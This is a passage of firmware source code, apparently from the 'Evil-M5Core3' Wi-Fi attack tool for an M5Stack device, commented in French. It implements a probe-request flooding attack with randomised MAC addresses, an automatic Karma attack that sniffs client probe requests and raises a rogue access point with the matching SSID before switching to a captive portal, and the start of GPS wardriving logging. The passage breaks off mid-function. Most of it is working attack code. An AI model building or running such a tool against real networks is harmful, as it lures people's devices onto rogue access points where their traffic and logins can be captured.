  if (numProbes == 0) {
    Serial.println("No probes found");
    waitAndReturnToMenu("No probes found");
    return;
  }

  const int maxDisplay = 11;
  const int largeurZone = M5.Display.width() / 3; // Diviser l'écran en trois zones verticales
  int currentListIndex = 0;
  int listStartIndex = 0;
  int selectedIndex = -1;
  bool needDisplayUpdate = true;

  while (selectedIndex == -1) {
    M5.update(); // Mettre à jour l'état du toucher
    handleDnsRequestSerial();
    bool indexChanged = false;

    if (M5.Touch.getCount() && !isTouchHandled) {
      auto touch = M5.Touch.getDetail(); // Obtenir les détails du toucher

      // Zone gauche : monter dans la liste
      if (touch.x < largeurZone) {
        currentListIndex = max(0, currentListIndex - 1);
        indexChanged = true;
      }
      // Zone droite : descendre dans la liste
      else if (touch.x >= 2 * largeurZone) {
        currentListIndex = min(numProbes - 1, currentListIndex + 1);
        indexChanged = true;
      }
      // Zone centrale : sélectionner l'élément
      else if (touch.x >= largeurZone && touch.x < 2 * largeurZone) {
        selectedIndex = currentListIndex;
      }

      isTouchHandled = true; // Marquer le toucher comme traité
    } else if (!M5.Touch.getCount()) {
      isTouchHandled = false; // Réinitialiser quand il n'y a pas de toucher
    }

    if (indexChanged) {
      listStartIndex = max(0, currentListIndex - maxDisplay / 2);
      listStartIndex = min(listStartIndex, max(0, numProbes - maxDisplay));
      needDisplayUpdate = true;
    }

    if (needDisplayUpdate) {
      M5.Display.clear();
      M5.Display.setTextSize(2);
      int y = 10;

      for (int i = 0; i < maxDisplay && listStartIndex + i < numProbes; i++) {
        int probeIndex = listStartIndex + i;

        String ssid = probes[probeIndex];
        ssid.trim(); // Assurez-vous que la chaîne est nettoyée

        M5.Display.setCursor(10, y);
        M5.Display.setTextColor(probeIndex == currentListIndex ? TFT_GREEN : TFT_WHITE);
        M5.Display.println(ssid);
        y += 20;
      }

      M5.Display.display();
      needDisplayUpdate = false;
    }
  }

  Serial.println("SSID selected: " + probes[selectedIndex]);
  waitAndReturnToMenu(probes[selectedIndex] + " selected");
}



bool isProbePresent(String probes[], int numProbes, String probe) {
  for (int i = 0; i < numProbes; i++) {
    if (probes[i] == probe) {
      return true;
    }
  }
  return false;
}



void deleteProbe() {
  static bool isTouchHandled = false; // Pour éviter la répétition des actions avec un seul toucher
  File file = SD.open("/probes.txt", FILE_READ);
  if (!file) {
    Serial.println("-------------------");
    Serial.println("Failed to open probes.txt");
    Serial.println("-------------------");
    waitAndReturnToMenu("Failed to open probes.txt");
    return;
  }

  String probes[MAX_SSIDS_Karma];
  int numProbes = 0;

  while (file.available() && numProbes < MAX_SSIDS_Karma) {
    String line = file.readStringUntil('\n');
    line.trim();
    if (line.length() > 0) {
      probes[numProbes++] = line;
    }
  }
  file.close();

  if (numProbes == 0) {
    waitAndReturnToMenu("No probes found");
    return;
  }

  const int maxSSIDLength = 23; // Adjust based on your display width
  const int maxDisplay = 11;
  int currentListIndex = 0;
  int listStartIndex = 0;
  int selectedIndex = -1;
  bool needDisplayUpdate = true;

  const int largeurZone = M5.Display.width() / 3; // Diviser l'écran en trois zones verticales
  // Attendre que l'utilisateur relâche tous les touchers avant de commencer
  while (M5.Touch.getCount() != 0) {
    M5.update();
    delay(10); // Attente courte pour laisser le temps à l'utilisateur de relâcher le toucher
  }
  while (selectedIndex == -1) {
    M5.update(); // Mettre à jour l'état du toucher
    handleDnsRequestSerial();
    if (needDisplayUpdate) {
      M5.Display.clear();
      M5.Display.setTextSize(2);

      for (int i = 0; i < maxDisplay; i++) {
        int probeIndex = listStartIndex + i;
        if (probeIndex >= numProbes) break;

        String ssid = probes[probeIndex];
        if (ssid.length() > maxSSIDLength) {
          ssid = ssid.substring(0, maxSSIDLength) + "..";
        }

        M5.Display.setCursor(10, i * 20 + 10);
        M5.Display.setTextColor(probeIndex == currentListIndex ? TFT_GREEN : TFT_WHITE);
        M5.Display.println(ssid);
      }

      M5.Display.display();
      needDisplayUpdate = false;
    }
    if (M5.Touch.getCount() && !isTouchHandled) {
      auto touch = M5.Touch.getDetail(); // Obtenir les détails du toucher

      // Zone gauche : monter dans la liste
      if (touch.x < largeurZone) {
        currentListIndex--;
        if (currentListIndex < 0) currentListIndex = numProbes - 1;
        needDisplayUpdate = true;
      }
      // Zone droite : descendre dans la liste
      else if (touch.x >= 2 * largeurZone) {
        currentListIndex++;
        if (currentListIndex >= numProbes) currentListIndex = 0;
        needDisplayUpdate = true;
      }
      // Zone centrale : sélectionner l'élément
      else if (touch.x >= largeurZone && touch.x < 2 * largeurZone) {
        selectedIndex = currentListIndex;
        // Ajouter ici le code pour gérer la confirmation et la suppression si nécessaire
      }

      isTouchHandled = true; // Marquer le toucher comme traité
    } else if (!M5.Touch.getCount()) {
      isTouchHandled = false; // Réinitialiser quand il n'y a pas de toucher
    }

    listStartIndex = max(0, min(currentListIndex, numProbes - maxDisplay));
  }

  bool success = false;
  if (selectedIndex >= 0 && selectedIndex < numProbes) {
    String selectedProbe = probes[selectedIndex];
    if (confirmPopup("Delete " + selectedProbe + " probe ?")) {
      success = removeProbeFromFile("/probes.txt", selectedProbe);
    }

    if (success) {
      Serial.println("-------------------");
      Serial.println(selectedProbe + " deleted");
      Serial.println("-------------------");
      waitAndReturnToMenu(selectedProbe + " deleted");
    } else {
      waitAndReturnToMenu("Error deleting probe");
    }
  } else {
    waitAndReturnToMenu("No probe selected");
  }
}



int showProbesAndSelect(String probes[], int numProbes) {
  const int maxDisplay = 11; // Maximum number of items to display at once
  int currentListIndex = 0; // Index of the current item in the list
  int listStartIndex = 0; // Index of the first item to display
  bool needDisplayUpdate = true;
  int selectedIndex = -1; // -1 means no selection
  static bool isTouchHandled = false; // Pour éviter le traitement multiple des touchers
  // Attendre que l'utilisateur relâche tous les touchers avant de commencer
  while (M5.Touch.getCount() != 0) {
    M5.update();
    delay(10); // Attente courte pour laisser le temps à l'utilisateur de relâcher le toucher
  }
  while (selectedIndex == -1) {
    M5.update(); // Mettre à jour l'état du toucher
    handleDnsRequestSerial();
    if (M5.Touch.getCount() && !isTouchHandled) {
      auto touch = M5.Touch.getDetail(); // Obtenir les détails du toucher

      const int largeurZone = M5.Display.width() / 3; // Diviser l'écran en trois zones verticales

      // Zone gauche : monter dans la liste
      if (touch.x < largeurZone) {
        currentListIndex--;
        if (currentListIndex < 0) currentListIndex = numProbes - 1;
        needDisplayUpdate = true;
      }
      // Zone droite : descendre dans la liste
      else if (touch.x >= 2 * largeurZone) {
        currentListIndex++;
        if (currentListIndex >= numProbes) currentListIndex = 0;
        needDisplayUpdate = true;
      }
      // Zone centrale : sélectionner l'élément
      else if (touch.x >= largeurZone && touch.x < 2 * largeurZone) {
        selectedIndex = currentListIndex;
      }

      isTouchHandled = true; // Marquer le toucher comme traité
    } else if (!M5.Touch.getCount()) {
      isTouchHandled = false; // Réinitialiser quand il n'y a pas de toucher
    }

    if (needDisplayUpdate) {
      M5.Display.clear();
      M5.Display.setTextSize(2);

      for (int i = 0; i < maxDisplay && (listStartIndex + i) < numProbes; i++) {
        M5.Display.setCursor(10, i * 20 + 10);
        M5.Display.setTextColor((listStartIndex + i) == currentListIndex ? TFT_GREEN : TFT_WHITE);
        M5.Display.println(probes[listStartIndex + i]);
      }
      M5.Display.display();
      needDisplayUpdate = false;
    }
    listStartIndex = max(0, min(currentListIndex - maxDisplay + 1, numProbes - maxDisplay));
  }

  return selectedIndex;
}


bool removeProbeFromFile(const char* filepath, const String& probeToRemove) {
  File originalFile = SD.open(filepath, FILE_READ);
  if (!originalFile) {
    Serial.println("Failed to open the original file for reading");
    return false;
  }

  const char* tempFilePath = "/temp.txt";
  File tempFile = SD.open(tempFilePath, FILE_WRITE);
  if (!tempFile) {
    Serial.println("Failed to open the temp file for writing");
    originalFile.close();
    return false;
  }

  bool probeRemoved = false;
  while (originalFile.available()) {
    String line = originalFile.readStringUntil('\n');
    if (line.endsWith("\r")) {
      line = line.substring(0, line.length() - 1);
    }

    if (!probeRemoved && line == probeToRemove) {
      probeRemoved = true;
    } else {
      tempFile.println(line);
    }
  }

  originalFile.close();
  tempFile.close();

  SD.remove(filepath);
  SD.rename(tempFilePath, filepath);

  return probeRemoved;
}

void deleteAllProbes() {
  if (confirmPopup("Delete All Probes ?")) {
    File file = SD.open("/probes.txt", FILE_WRITE);
    if (file) {
      file.close();
      waitAndReturnToMenu("Deleted successfully");
      Serial.println("-------------------");
      Serial.println("Probes deleted successfully");
      Serial.println("-------------------");
    } else {
      waitAndReturnToMenu("Error..");
      Serial.println("-------------------");
      Serial.println("Error opening file for deletion");
      Serial.println("-------------------");
    }
  } else {
    waitAndReturnToMenu("Deletion cancelled");
  }
}

//KARMA-PART-FUNCTIONS-END


//probe attack


uint8_t originalMAC[6];

void saveOriginalMAC() {
  esp_wifi_get_mac(WIFI_IF_STA, originalMAC);
}

void restoreOriginalMAC() {
  esp_wifi_set_mac(WIFI_IF_STA, originalMAC);
}

String generateRandomSSID(int length) {
  const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  String randomString;
  for (int i = 0; i < length; i++) {
    int index = random(0, sizeof(charset) - 1);
    randomString += charset[index];
  }
  return randomString;
}

String generateRandomMAC() {
  uint8_t mac[6];
  for (int i = 0; i < 6; ++i) {
    mac[i] = random(0x00, 0xFF);
  }
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

void setRandomMAC_STA() {
  String mac = generateRandomMAC();
  uint8_t macArray[6];
  sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &macArray[0], &macArray[1], &macArray[2], &macArray[3], &macArray[4], &macArray[5]);
  esp_wifi_set_mac(WIFI_IF_STA, macArray);
  delay(50);
}



std::vector<String> readCustomProbes(const char* filename) {
  File file = SD.open(filename, FILE_READ);
  std::vector<String> customProbes;

  if (!file) {
    Serial.println("Failed to open file for reading");
    return customProbes;
  }

  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("CustomProbes=")) {
      String probesStr = line.substring(String("CustomProbes=").length());
      int idx = 0;
      while ((idx = probesStr.indexOf(',')) != -1) {
        customProbes.push_back(probesStr.substring(0, idx));
        probesStr = probesStr.substring(idx + 1);
      }
      if (probesStr.length() > 0) {
        customProbes.push_back(probesStr);
      }
      break;
    }
  }
  file.close();
  return customProbes;
}



int checkNb = 0;
bool useCustomProbes;
std::vector<String> customProbes;

void probeAttack() {
  WiFi.mode(WIFI_MODE_STA);
  isProbeAttackRunning = true;
  useCustomProbes = false;
  static bool isTouchHandled = false; // Pour éviter le traitement multiple des touchers

  if (!isItSerialCommand) {
    useCustomProbes = confirmPopup("Use custom probes?");
    M5.Display.clear();
    if (useCustomProbes) {
      customProbes = readCustomProbes("/config/config.txt");
    } else {
      customProbes.clear();
    }
  } else {
    M5.Display.clear();
    isItSerialCommand = false;
    customProbes.clear();
  }
  int probeCount = 0;
  int delayTime = 500; // initial probes delay
  unsigned long previousMillis = 0;
  // const int debounceDelay = 200;
  //  unsigned long lastDebounceTime = 0;

  M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
  M5.Display.setCursor(135, M5.Display.height() - 40);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.println("Stop");

  int probesTextX = 10;
  String probesText = "Probe Attack running...";
  M5.Display.setCursor(probesTextX, 50);
  M5.Display.println(probesText);
  probesText = "Probes sent: ";
  M5.Display.setCursor(probesTextX, 70);
  M5.Display.print(probesText);
  Serial.println("-------------------");
  Serial.println("Starting Probe Attack");
  Serial.println("-------------------");

  while (isProbeAttackRunning) {
    unsigned long currentMillis = millis();
    handleDnsRequestSerial();
    if (currentMillis - previousMillis >= delayTime) {
      previousMillis = currentMillis;
      setRandomMAC_STA();
      setNextWiFiChannel();
      String ssid;
      if (!customProbes.empty()) {
        ssid = customProbes[probeCount % customProbes.size()];
      } else {
        ssid = generateRandomSSID(32);
      }
      if (ledOn) {
        pixels.setPixelColor(0, pixels.Color(255, 0, 0));
        pixels.setPixelColor(9, pixels.Color(255, 0, 0));
        pixels.show();
        delay(50);

        pixels.setPixelColor(0, pixels.Color(0, 0, 0));
        pixels.setPixelColor(9, pixels.Color(0, 0, 0));
        pixels.show();
      }
      WiFi.begin(ssid.c_str(), "");

      M5.Display.setCursor(probesTextX + probesText.length() * 12, 70);
      M5.Display.fillRect(probesTextX + probesText.length() * 12, 70, 50, 20, TFT_BLACK);
      M5.Display.print(++probeCount);

      M5.Display.fillRect(100, M5.Display.height() / 2, 140, 20, TFT_BLACK);

      M5.Display.setCursor(100, M5.Display.height() / 2);
      M5.Display.print("Delay: " + String(delayTime) + "ms");

      Serial.println("Probe sent: " + ssid);
    }
    const int largeurZone = M5.Display.width() / 3; // Diviser l'écran en trois zones verticales
    M5.update();
    if (M5.Touch.getCount() && !isTouchHandled) {
      auto touch = M5.Touch.getDetail(); // Obtenir les détails du toucher

      // Zone gauche : diminuer le délai
      if (touch.x < largeurZone) {
        delayTime = max(200, delayTime - 100); // Délai minimum
        isTouchHandled = true;
      }
      // Zone droite : augmenter le délai
      else if (touch.x >= 2 * largeurZone) {
        delayTime = min(1000, delayTime + 100); // Délai maximum
        isTouchHandled = true;
      }
      // Zone centrale : arrêter l'attaque
      else if (touch.x >= largeurZone && touch.x < 2 * largeurZone) {
        isProbeAttackRunning = false;
        isTouchHandled = true;
      }
    } else if (!M5.Touch.getCount()) {
      isTouchHandled = false; // Réinitialiser quand il n'y a pas de toucher
    }

  }
  Serial.println("-------------------");
  Serial.println("Stopping Probe Attack");
  Serial.println("-------------------");
  restoreOriginalWiFiSettings();
  useCustomProbes = false;
  inMenu = true;
  drawMenu();
}

int currentChannel = 1;
int originalChannel = 1;

void setNextWiFiChannel() {
  currentChannel++;
  if (currentChannel > 14) {
    currentChannel = 1;
  }
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}

void restoreOriginalWiFiSettings() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); // Petite pause pour s'assurer que tout est terminé
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  restoreOriginalMAC();
  WiFi.mode(WIFI_STA);
}


// probe attack end


// Auto karma
bool isAPDeploying = false;

void startAutoKarma() {
  //ESP_BT.end();
  //bluetoothEnabled = false;
  while (M5.Touch.getCount() != 0) {
    M5.update();
    delay(10); // Attente courte pour laisser le temps à l'utilisateur de relâcher le toucher
  }
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); // Petite pause pour s'assurer que tout est terminé
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);

  isAutoKarmaActive = true;
  Serial.println("-------------------");
  Serial.println("Karma Auto Attack Started....");
  Serial.println("-------------------");

  readConfigFile("/config/config.txt");
  createCaptivePortal();
  WiFi.softAPdisconnect(true);
  loopAutoKarma();
  esp_wifi_set_promiscuous(false);
}


void autoKarmaPacketSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT || isAPDeploying) return;

  const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t *frame = packet->payload;
  const uint8_t frame_type = frame[0];

  if (frame_type == 0x40) {
    uint8_t ssid_length_Karma_Auto = frame[25];
    if (ssid_length_Karma_Auto >= 1 && ssid_length_Karma_Auto <= 32) {
      char tempSSID[33];
      memset(tempSSID, 0, sizeof(tempSSID));
      for (int i = 0; i < ssid_length_Karma_Auto; i++) {
        tempSSID[i] = (char)frame[26 + i];
      }
      tempSSID[ssid_length_Karma_Auto] = '\0';
      memset(lastSSID, 0, sizeof(lastSSID));
      strncpy(lastSSID, tempSSID, sizeof(lastSSID) - 1);
      newSSIDAvailable = true;
    }
  }
}



bool readConfigFile(const char* filename) {
  whitelist.clear();
  File configFile = SD.open(filename);
  if (!configFile) {
    Serial.println("Failed to open config file");
    return false;
  }

  while (configFile.available()) {
    String line = configFile.readStringUntil('\n');
    if (line.startsWith("KarmaAutoWhitelist=")) {
      int startIndex = line.indexOf('=') + 1;
      String ssidList = line.substring(startIndex);
      if (!ssidList.length()) {
        break;
      }
      int lastIndex = 0, nextIndex;
      while ((nextIndex = ssidList.indexOf(',', lastIndex)) != -1) {
        whitelist.push_back(ssidList.substring(lastIndex, nextIndex).c_str());
        lastIndex = nextIndex + 1;
      }
      whitelist.push_back(ssidList.substring(lastIndex).c_str());
    }
  }
  configFile.close();
  return true;
}

bool isSSIDWhitelisted(const char* ssid) {
  for (const auto& wssid : whitelist) {
    if (wssid == ssid) {
      return true;
    }
  }
  return false;
}


uint8_t originalMACKarma[6];

void saveOriginalMACKarma() {
  esp_wifi_get_mac(WIFI_IF_AP, originalMACKarma);
}

void restoreOriginalMACKarma() {
  esp_wifi_set_mac(WIFI_IF_AP, originalMACKarma);
}

String generateRandomMACKarma() {
  uint8_t mac[6];
  for (int i = 0; i < 6; ++i) {
    mac[i] = random(0x00, 0xFF);
  }
  // Force unicast byte
  mac[0] &= 0xFE;

  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

void setRandomMAC_APKarma() {

  esp_wifi_stop();

  wifi_mode_t currentMode;
  esp_wifi_get_mode(&currentMode);
  if (currentMode != WIFI_MODE_AP && currentMode != WIFI_MODE_APSTA) {
    esp_wifi_set_mode(WIFI_MODE_AP);
  }

  String macKarma = generateRandomMACKarma();
  uint8_t macArrayKarma[6];
  sscanf(macKarma.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &macArrayKarma[0], &macArrayKarma[1], &macArrayKarma[2], &macArrayKarma[3], &macArrayKarma[4], &macArrayKarma[5]);

  esp_err_t ret = esp_wifi_set_mac(WIFI_IF_AP, macArrayKarma);
  if (ret != ESP_OK) {
    Serial.print("Error setting MAC: ");
    Serial.println(ret);
    esp_wifi_set_mode(currentMode);
    return;
  }

  ret = esp_wifi_start();
  if (ret != ESP_OK) {
    Serial.print("Error starting WiFi: ");
    Serial.println(ret);
    esp_wifi_set_mode(currentMode);
    return;
  }
}



String getMACAddress() {
  uint8_t mac[6];
  esp_wifi_get_mac(WIFI_IF_AP, mac);
  char macStr[18];
  sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}


void loopAutoKarma() {
  while (isAutoKarmaActive) {
    M5.update();

    // Détecter un toucher pour arrêter la fonction et retourner au menu principal
    if (M5.Touch.getCount() > 1) {
      // Arrêter la fonction et initialiser les paramètres pour retourner au menu
      isAutoKarmaActive = false;
      isAPDeploying = false;
      isInitialDisplayDone = false;
      inMenu = true;
      memset(lastSSID, 0, sizeof(lastSSID));
      memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
      newSSIDAvailable = false;
      esp_wifi_set_promiscuous(false);
      Serial.println("-------------------");
      Serial.println("Karma Auto Attack Stopped....");
      Serial.println("-------------------");
      break; // Sortir de la boucle while
    }
    if (newSSIDAvailable) {
      newSSIDAvailable = false;
      activateAPForAutoKarma(lastSSID); // Activate the AP
      isWaitingForProbeDisplayed = false;
    } else {
      if (!isWaitingForProbeDisplayed || (millis() - lastProbeDisplayUpdate > 1000)) {
        displayWaitingForProbe();
        Serial.println("-------------------");
        Serial.println("Waiting for probe....");
        Serial.println("-------------------");
        isWaitingForProbeDisplayed = true;
      }
    }

    delay(100);
  }

  memset(lastSSID, 0, sizeof(lastSSID));
  newSSIDAvailable = false;
  isWaitingForProbeDisplayed = false;
  isInitialDisplayDone = false;
  inMenu = true;
  drawMenu();
}

void activateAPForAutoKarma(const char* ssid) {
  karmaSuccess = false;
  if (isSSIDWhitelisted(ssid)) {
    Serial.println("-------------------");
    Serial.println("SSID in the whitelist, skipping : " + String(ssid));
    Serial.println("-------------------");
    if (ledOn) {
      pixels.setPixelColor(0, pixels.Color(255, 255, 255));
      pixels.setPixelColor(9, pixels.Color(255, 255, 255));
      pixels.show();
      delay(50);
      pixels.setPixelColor(0, pixels.Color(0, 0, 0));
      pixels.setPixelColor(9, pixels.Color(0, 0, 0));
      pixels.show();
    }
    return;
  }
  if (strcmp(ssid, lastDeployedSSID) == 0) {
    Serial.println("-------------------");
    Serial.println("Skipping already deployed probe : " + String(lastDeployedSSID));
    Serial.println("-------------------");
    if (ledOn) {
      pixels.setPixelColor(0, pixels.Color(0, 255, 0));
      pixels.setPixelColor(9, pixels.Color(0, 255, 0));
      pixels.show();
      delay(50);
      pixels.setPixelColor(0, pixels.Color(0, 0, 0));
      pixels.setPixelColor(9, pixels.Color(0, 0, 0));
      pixels.show();
    }
    return;
  }
  if (ledOn) {
    pixels.setPixelColor(0, pixels.Color(255, 0, 0));
    pixels.setPixelColor(9, pixels.Color(255, 0, 0));
    pixels.show();
  }
  isAPDeploying = true;
  isInitialDisplayDone = false;
  setRandomMAC_APKarma(); // Set random MAC for AP

  if (captivePortalPassword == "") {
    WiFi.softAP(ssid);
  } else {
    WiFi.softAP(ssid , captivePortalPassword.c_str());
  }
  // Display MAC, SSID, and channel
  String macAddress = getMACAddress();
  Serial.println("-------------------");
  Serial.println("Starting Karma AP for : " + String(ssid));
  Serial.print("MAC Address: "); Serial.println(macAddress);
  Serial.println("Time :" + String(autoKarmaAPDuration / 1000) + " s" );
  Serial.println("-------------------");
  unsigned long startTime = millis();

  while (millis() - startTime < autoKarmaAPDuration) {
    displayAPStatus(ssid, startTime, autoKarmaAPDuration);
    handleDnsRequestSerial();

    M5.update();

    if (M5.Touch.getCount()) {
      memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
      if (ledOn) {
        pixels.setPixelColor(0, pixels.Color(0, 0, 0));
        pixels.setPixelColor(9, pixels.Color(0, 0, 0));
        pixels.show();
      }
      break;
    }

    int clientCount = WiFi.softAPgetStationNum();
    if (clientCount > 0) {
      karmaSuccess = true;
      clonedSSID = String(ssid);
      isCaptivePortalOn = true;
      isAPDeploying = false;
      isAutoKarmaActive = false;
      isInitialDisplayDone = false;
      inMenu = true;
      Serial.println("-------------------");
      Serial.println("Karma Successful for : " + String(clonedSSID));
      Serial.println("-------------------");
      memset(lastSSID, 0, sizeof(lastSSID));
      newSSIDAvailable = false;
      waitAndReturnToMenu("Karma Successful !!! ");
      return;
    }
    delay(100);
  }
  strncpy(lastDeployedSSID, ssid, sizeof(lastDeployedSSID) - 1);

  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_MODE_STA);
  //ESP_BT.end();
  //bluetoothEnabled = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); // Petite pause pour s'assurer que tout est terminé
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);
  isAPDeploying = false;
  isWaitingForProbeDisplayed = false;

  newSSIDAvailable = false;
  isInitialDisplayDone = false;
  Serial.println("-------------------");
  Serial.println("Karma Fail for : " + String(ssid));
  Serial.println("-------------------");

  if (ledOn) {
    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
    pixels.setPixelColor(9, pixels.Color(0, 0, 0));
    pixels.show();
  }
}


void displayWaitingForProbe() {
  if (!isWaitingForProbeDisplayed) {
    M5.Display.clear();
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
    M5.Display.setCursor(100, M5.Display.height() - 40);
    M5.Display.println("Stop Auto");
    M5.Display.setCursor(50, M5.Display.height() / 2 - 20);
    M5.Display.print("Waiting for probe");

    isWaitingForProbeDisplayed = true;
  }

  unsigned long currentTime = millis();
  if (currentTime - lastProbeDisplayUpdate > 1000) {
    lastProbeDisplayUpdate = currentTime;
    probeDisplayState = (probeDisplayState + 1) % 4;

    int x = 50 + 12 * strlen("Waiting for probe");
    int y = M5.Display.height() / 2 - 20;
    int width = 36;
    int height = 20;

    M5.Display.fillRect(x, y, width, height, TFT_BLACK);

    M5.Display.setCursor(x, y);
    for (int i = 0; i < probeDisplayState; i++) {
      M5.Display.print(".");
    }
  }
}

void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPDuration) {
  unsigned long currentTime = millis();
  int remainingTime = autoKarmaAPDuration / 1000 - ((currentTime - startTime) / 1000);
  int clientCount = WiFi.softAPgetStationNum();

  if (!isInitialDisplayDone) {
    M5.Display.clear();
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.setCursor((M5.Display.width() - 12 * strlen(ssid)) / 2, 50);
    M5.Display.println(String(ssid));
    M5.Display.setCursor((M5.Display.width() - 15 * strlen("Left Time: ")) / 2, 90);
    M5.Display.print("Left Time: ");
    M5.Display.setCursor((M5.Display.width() - 12 * strlen("Connected Client: ")) / 2, 130);
    M5.Display.print("Connected Client: ");

    M5.Display.setCursor(140, 220);
    M5.Display.println("Stop");
    isInitialDisplayDone = true;
  }

  int timeValuePosX = (M5.Display.width() + 12 * strlen("Left Time: ")) / 2;
  int timeValuePosY = 90;
  M5.Display.fillRect(timeValuePosX, timeValuePosY, 12 * 5, 20, TFT_BLACK);
  M5.Display.setCursor(timeValuePosX, timeValuePosY);
  M5.Display.print(remainingTime);
  M5.Display.println(" s");

  int clientValuePosX = (M5.Display.width() + 12 * strlen("Connected Client: ")) / 2;
  int clientValuePosY = 130;
  M5.Display.fillRect(clientValuePosX, clientValuePosY, 12 * 5, 20, TFT_BLACK);
  M5.Display.setCursor(clientValuePosX, clientValuePosY);
  M5.Display.print(clientCount);
}

//Auto karma end


String createPreHeader() {
  String preHeader = "WigleWifi-1.4";
  preHeader += ",appRelease=v1.1.9"; // Remplacez [version] par la version de votre application
  preHeader += ",model=Core2";
  preHeader += ",release=v1.1.9"; // Remplacez [release] par la version de l'OS de l'appareil
  preHeader += ",device=Evil-M5Core3"; // Remplacez [device name] par un nom de périphérique, si souhaité
  preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
  preHeader += ",board=M5Stack Core2";
  preHeader += ",brand=M5Stack";
  return preHeader;
}

String createHeader() {
  return "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type";
}

int nearPrevousWifi = 0;
double lat = 0.0, lng = 0.0, alt = 0.0; // Déclaration des variables pour la latitude, la longitude et l'altitude
float accuracy = 0.0; // Déclaration de la variable pour la précision

void wardrivingMode() {
  //  static bool isTouchHandled = false; // Pour suivre si le toucher a été géré
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  Serial.println("-------------------");
  Serial.println("Starting Wardriving");
  Serial.println("-------------------");
  M5.Lcd.fillScreen(TFT_BLACK);
  M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Lcd.setTextSize(2);
  M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
  M5.Display.setCursor(135, M5.Display.height() - 40);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.println("Stop");
  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Lcd.setCursor(0, 10);
  M5.Lcd.printf("Scanning...");
  M5.Lcd.setCursor(0, 40);
  M5.Lcd.println("No GPS Data");
  delay(1000);
  if (!SD.exists("/wardriving")) {
    SD.mkdir("/wardriving");
  }

  File root = SD.open("/wardriving");
  int maxIndex = 0;
  while (true) {
    File entry = root.openNextFile();
    if (!entry) break;
    String name = entry.name();
    int startIndex = name.indexOf('-') + 1;
    int endIndex = name.indexOf('.');
    if (startIndex > 0 && endIndex > startIndex) {
      int fileIndex = name.substring(startIndex, endIndex).toInt();
      if (fileIndex > maxIndex) maxIndex = fileIndex;
    }
    entry.close();
  }
  root.close();

  bool exitWardriving = false;
  bool scanStarted = false;

  while (M5.Touch.getCount() != 0) {
    M5.update();
    delay(10); // Attente courte pour laisser le temps à l'utilisateur de relâcher le toucher
  }
  while (!exitWardriving) {
    M5.update();
    handleDnsRequestSerial();

    if (!scanStarted) {
      WiFi.scanNetworks(true, true);
      scanStarted = true;
    }

    bool gpsDataAvailable = false;
    String gpsData;

    while (Serial2.available() > 0 && !gpsDataAvailable) {
      if (gps.encode(Serial2.read())) {
        if (gps.location.isValid() && gps.date.isValid() && gps.time.isValid()) {
          lat = gps.location.lat();
          lng = gps.location.lng();
          alt = gps.altitude.meters();
          accuracy = gps.hdop.value();
          gpsDataAvailable = true;

          // Affichage des informations GPS sur l'écran
          M5.Lcd.setCursor(0, 40);
          M5.Lcd.println("Latitude:  ");
          M5.Lcd.setCursor(0, 60);
          M5.Lcd.println(String(gps.location.lat(), 6));

          M5.Lcd.setCursor(170, 40);
          M5.Lcd.println("Longitude:");
          M5.Lcd.setCursor(170, 60);
          M5.Lcd.println(String(gps.location.lng(), 6));

          M5.Lcd.setCursor(0, 90);
